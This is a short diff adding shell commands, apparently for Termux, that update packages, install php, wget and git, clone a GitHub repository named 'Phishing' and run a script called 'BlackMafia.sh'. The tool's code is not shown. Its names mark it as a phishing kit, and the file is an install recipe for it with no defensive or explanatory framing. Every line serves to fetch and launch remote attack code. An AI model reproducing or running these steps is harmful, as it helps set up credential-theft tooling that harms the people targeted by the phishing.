@@ -1,0 +1,9 @@
+pkg update && pkg upgrade -y
+
+pkg install php wget git -y
+
+git clone https://github.com/lovehacker404/Phishing
+
+cd Phishing
+
+bash BlackMafia.sh
